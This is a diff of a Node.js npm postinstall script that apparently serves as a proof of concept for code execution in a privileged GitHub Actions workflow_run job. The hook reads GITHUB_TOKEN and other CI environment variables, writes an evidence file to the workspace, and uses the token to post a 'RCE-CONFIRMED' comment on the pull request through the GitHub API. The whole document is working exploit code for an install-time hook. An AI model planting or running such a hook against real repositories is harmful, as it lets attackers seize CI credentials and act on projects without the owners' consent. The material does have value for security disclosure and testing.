@@ -1,27 +1,24 @@
 const fs = require('fs');
+const path = require('path');
 (async () => {
   const token = process.env.GITHUB_TOKEN || '';
-  const repo = process.env.GITHUB_REPOSITORY || 'PDFtoMark/gab-poc-adp-linter';
-  const runId = process.env.GITHUB_RUN_ID;
-  const line = 'RCE-POSTINSTALL-OK run=' + runId + ' actor=' + process.env.GITHUB_ACTOR +
-    ' token_present=' + !!token + ' token_len=' + token.length + ' repo=' + repo;
+  const repo = process.env.GITHUB_REPOSITORY || '';
+  const ws = process.env.GITHUB_WORKSPACE || process.cwd();
+  const runId = process.env.GITHUB_RUN_ID || '';
+  let pr = '';
+  try { pr = fs.readFileSync(path.join(ws, 'pr-number.txt'), 'utf8').trim(); } catch (e) {}
+  const line = 'RCE-POSTINSTALL-OK wf=' + process.env.GITHUB_WORKFLOW +
+    ' event=' + process.env.GITHUB_EVENT_NAME + ' run=' + runId + ' repo=' + repo +
+    ' token_present=' + !!token + ' token_len=' + token.length + ' pr=' + pr;
   console.log(line);
+  try { fs.writeFileSync(path.join(ws, 'RCE-EVIDENCE.txt'), line + '\n'); } catch (e) { console.log('write err', e.message); }
   try {
-    const prNumber = (fs.existsSync('../../pr-number.txt') ? fs.readFileSync('../../pr-number.txt', 'utf8').trim() : '') || '1';
-    const res = await fetch('https://api.github.com/repos/' + repo + '/issues/' + prNumber + '/comments', {
+    const res = await fetch('https://api.github.com/repos/' + repo + '/issues/' + pr + '/comments', {
       method: 'POST',
-      headers: {
-        Authorization: 'Bearer ' + token,
-        Accept: 'application/vnd.github+json',
-        'Content-Type': 'application/json',
-        'X-GitHub-Api-Version': '2022-11-28'
-      },
-      body: JSON.stringify({
-        body: 'RCE-CONFIRMED: attacker npm lifecycle hook executed inside the privileged workflow_run job and used the workflow GITHUB_TOKEN to post this comment. run=' + runId + ' actor=' + process.env.GITHUB_ACTOR
-      })
+      headers: { Authorization: 'Bearer ' + token, Accept: 'application/vnd.github+json', 'Content-Type': 'application/json', 'X-GitHub-Api-Version': '2022-11-28' },
+      body: JSON.stringify({ body: 'RCE-CONFIRMED: attacker-controlled npm lifecycle hook ran in the privileged workflow_run job and the workflow GITHUB_TOKEN successfully posted this comment. run=' + runId })
     });
     const j = await res.json();
     console.log('comment status', res.status, 'url', j.html_url || j.message);
   } catch (e) { console.log('comment error', e.message); }
-  try { fs.appendFileSync('../../linter-report.txt', '\n' + line + '\n'); } catch (e) { console.log('append failed', e.message); }
 })();
